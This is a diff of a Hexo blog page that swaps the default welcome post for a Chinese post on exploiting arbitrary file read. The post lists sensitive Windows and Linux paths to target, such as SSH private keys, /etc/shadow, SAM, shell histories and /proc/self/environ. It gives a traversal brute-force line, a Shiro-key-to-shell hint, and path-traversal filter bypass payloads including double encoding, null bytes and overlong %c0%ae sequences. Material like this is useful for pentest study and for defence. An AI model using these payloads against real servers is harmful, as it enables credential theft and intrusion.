@@ -16,21 +16,23 @@
   <meta name="author" content="springtime">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="敏感文件路径windows1234567C:\boot.ini #查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件C:\Windows\repair\sam #存储系统初次安装的密码C:\Program Files\mysql\my.ini #Mysql配置C:\Program Files\mysql\data\mysql\user.M">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2022/09/12/hello-world/index.html">
+<meta property="og:title" content="AFR深入利用的一些技巧">
+<meta property="og:url" content="http://example.com/2022/05/23/AFR%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/index.html">
 <meta property="og:site_name" content="spring&#39;s blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="敏感文件路径windows1234567C:\boot.ini #查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件C:\Windows\repair\sam #存储系统初次安装的密码C:\Program Files\mysql\my.ini #Mysql配置C:\Program Files\mysql\data\mysql\user.M">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-09-12T09:32:45.994Z">
-<meta property="article:modified_time" content="2023-01-22T16:10:39.317Z">
+<meta property="article:published_time" content="2022-05-23T01:45:22.000Z">
+<meta property="article:modified_time" content="2023-02-03T13:43:33.841Z">
 <meta property="article:author" content="springtime">
+<meta property="article:tag" content="任意文件读取">
+<meta property="article:tag" content="bypass">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Hello World - spring&#39;s blog</title>
+  <title>AFR深入利用的一些技巧 - spring&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -195,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text="AFR深入利用的一些技巧"></span>
           
         </div>
 
@@ -206,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-09-12 17:32" pubdate>
-          September 12, 2022 pm
+        <time datetime="2022-05-23 09:45" pubdate>
+          May 23, 2022 am
         </time>
       </span>
     
@@ -218,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k words
+          2.9k words
         
       </span>
     
@@ -229,7 +231,7 @@
         
         
         
-          12 mins
+          25 mins
         
       </span>
     
@@ -267,40 +269,50 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World</h1>
+            <h1 style="display: none">AFR深入利用的一些技巧</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+                <h2 id="敏感文件路径"><a href="#敏感文件路径" class="headerlink" title="敏感文件路径"></a>敏感文件路径</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\boot.ini #查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件<br>C:\Windows\repair\sam #存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini #Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD #Mysql root<br>C:\Windows\php.ini #php配置信息<br>C:\Windows\my.ini #Mysql配置信息<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">/root/.ssh/authorized_keys #如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br>/root/.ssh/id_rsa #ssh私钥,ssh公钥是id_rsa.pub,私钥登录 ssh -i id_rsa root@IP地址<br>/root/.ssh/id_ras.keystore #记录每个访问计算机用户的公钥<br>/root/.ssh/known_hosts<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br>/etc/passwd # 账户信息<br>/etc/shadow # 账户密码文件<br>/etc/my.cnf #mysql 配置文件<br>/etc/httpd/conf/httpd.conf # Apache配置文件<br>/etc/redhat-release #系统版本 <br>/root/.bash_history #用户历史命令记录文件<br>/root/.mysql_history #mysql历史命令记录文件<br>/var/lib/mlocate/mlocate.db #全文件路径<br>/proc/self/fd/fd[0-9]*(文件标识符)<br>/proc/mounts #记录系统挂载设备<br>/porc/config.gz #内核配置文件<br>/porc/self/cmdline #当前进程的cmdline参数<br>/proc/sched_debug #配置文件可以看到当前运行的进程并可以获得对应进程的pid<br>/proc/pid/cmdline   #可以看到对应pid进程的完整命令行。<br>/proc/net/fib_trie   #内网IP<br>/proc/self/environ   #环境变量<br>/proc/self/loginuid   #当前用户<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
+<h4 id="用户家目录"><a href="#用户家目录" class="headerlink" title="用户家目录"></a>用户家目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">.bash_history <br>.zsh_history<br>.psql_history<br>.mysql_history<br>.profile <br>.bashrc<br>.gitconfig<br>.viminfo<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">暴破所有用户的.bash_history：</span><br>../../../home/§root§/.bash_history<br><br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
+<h4 id="主机凭证"><a href="#主机凭证" class="headerlink" title="主机凭证"></a>主机凭证</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">/root/.ssh/id_rsa  #私钥<br>/root/.ssh/authorized_keys  #公钥存储文件<br>/root/.ssh/id_rsa.keystore<br>/root/.ssh/known_hosts #记录每个访问计算机用户的公钥<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-<h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem 1"></a>problem 1</h3><p>使用了图床插件，生成时会自动将图片复制到<blogname>文件夹下，但仍需要修改图片地址</p>
-<p>将图片全部移动至_post文件夹下，注意md中图片的地址需要加上日期，如下形式：</p>
-<p>.&#x2F;2022&#x2F;09&#x2F;12&#x2F;新型EL-webshell初探&#x2F;image-20220907140219279.png</p>
-<p>{filennam}&#x2F;pic_id.png</p>
-<p><strong>注意用斜杠而非反斜杠</strong></p>
-<h3 id="problem2"><a href="#problem2" class="headerlink" title="problem2"></a>problem2</h3><p>有时候使用花括号{}等会出现字符转义失败</p>
-<p>修复见：<a target="_blank" rel="noopener" href="https://coding.f10.org/HEXO/%E4%BF%AE%E5%A4%8Dhexo%E8%8A%B1%E6%8B%AC%E5%8F%B7%E6%98%BE%E7%A4%BA%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2123%E5%92%8C125/">https://coding.f10.org/HEXO/%E4%BF%AE%E5%A4%8Dhexo%E8%8A%B1%E6%8B%AC%E5%8F%B7%E6%98%BE%E7%A4%BA%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2123%E5%92%8C125/</a></p>
-<p>修复文件：node_modules\highlight.js\lib\core.js#57修改为：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-keyword">return</span> value<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#x27;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#123;/g</span>, <span class="hljs-string">&#x27;&amp;#123;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#125;/g</span>, <span class="hljs-string">&#x27;&amp;#125;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="全盘路径⭐"><a href="#全盘路径⭐" class="headerlink" title="全盘路径⭐"></a>全盘路径⭐</h4><p>适用于目标机器安装了mlocate的情况，不过一般可能需要root权限，locate命令利用<code>mlocate.db</code>数据库进行全盘文件名搜索，位置在<code>/var/lib/mlocate/mlocate.db</code>，获取到<code>mlocate.db</code>文件后本地利用如下命令输出指定路径：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">locate -d mlocate.db /   #输出所有文件路径<br>locate -d mlocate.db config #输出所有文件名包含config的文件路径<br></code></pre></td></tr></table></figure>
 
-<p>与_config.yml#48</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">highlight:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">auto_detect:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tab_replace:</span> <span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-attr">wrap:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">hljs:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">prismjs:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">preprocess:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tab_replace:</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
+<h4 id="后端配置文件"><a href="#后端配置文件" class="headerlink" title="后端配置文件"></a>后端配置文件</h4><ul>
+<li>java站点<br><code>/WEB-INF/web.xml</code><br><code>/WEB-INF/classes/applicationContext.xml</code><br><code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br><code>core.jar</code>: 如果遇到Shiro站点，可以直接利用全盘路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li>
+<li>tomcat<br><code>/usr/local/tomcat/conf/tomcat-users.xml</code></li>
+<li>nginx<br><code>/www/nginx/conf/nginx.conf</code><br><code>/etc/nginx/nginx.conf</code><br><code>/usr/local/nginx/conf/nginx.conf</code><br><code>/usr/local/etc/nginx/nginx.conf</code></li>
+<li>apache<br><code>/etc/httpd/conf/httpd.conf</code><br><code>/etc/apache2/apache2.conf</code><br><code>/etc/apache2/httpd.conf</code></li>
+<li>redis<br><code>/etc/redis.conf</code></li>
+<li>ssh<br><code>/etc/ssh/sshd_config</code></li>
+</ul>
+<h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><ul>
+<li><p>tomcat<br>可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径<br><code>/webapps/ROOT/logs/catalina.out</code></p>
+</li>
+<li><p>apache<br><code>/var/log/apache2/access.log</code><br><code>/var/log/apache2/error.log</code><br><code>/var/log/httpd/access_log</code><br><code>/etc/httpd/logs/access_log</code><br><code>/etc/httpd/logs/error_log</code><br><code>/etc/httpd/logs/error.log</code></p>
+</li>
+<li><p>nginx<br><code>/var/log/nginx/access.log</code><br><code>/var/log/nginx/error.log</code><br><code>/usr/local/var/log/nginx/access.log</code><br><code>/usr/local/nginx/logs</code></p>
+</li>
+<li><p>jetty</p>
+<p><code>/usr/local/services/jetty-8.1.16/logs/stderrout.log</code><br><code>/usr/local/services/jetty-8.1.16/etc/jetty.xml</code></p>
+</li>
+</ul>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><ol>
+<li>url编码代替.或者&#x2F;，如使用%2F代替&#x2F;<br><code>?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></li>
+<li>二次编码(%25)<br><code>?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd</code></li>
+<li>加入+<br><code>?filename=.+./.+./bin/redacted.dll</code></li>
+<li>%00<br><code>?filename=.%00./file.php</code><br><code>/etc/passwd%00.jpg</code></li>
+<li><code>\</code><br><code>?filename=..%5c..%5c/windows/win.ini</code></li>
+<li>Java %c0%ae 安全模式绕过<br><code>?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code></li>
+</ol>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
                 
               </div>
             
@@ -308,6 +320,15 @@
             <div>
               <div class="post-metas my-3">
   
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">#任意文件读取</a>
+      
+        <a href="/tags/bypass/">#bypass</a>
+      
+    </div>
   
 </div>
 
@@ -317,8 +338,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>http://example.com/2022/09/12/hello-world/</div>
+      <div>AFR深入利用的一些技巧</div>
+      <div>http://example.com/2022/05/23/AFR深入利用的一些技巧/</div>
     </div>
     <div class="license-meta">
       
@@ -330,7 +351,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>September 12, 2022</div>
+          <div>May 23, 2022</div>
         </div>
       
       
@@ -360,21 +381,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/" title="新型EL webshell初探">
+                      <a href="/2022/06/22/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%B0getshell/" title="从数据库到getshell">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">新型EL webshell初探</span>
+                        <span class="hidden-mobile">从数据库到getshell</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
-                    
-                      <a href="/2022/06/22/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%B0getshell/" title="从数据库到getshell">
-                        <span class="hidden-mobile">从数据库到getshell</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
                     
                   </article>
                 </div>
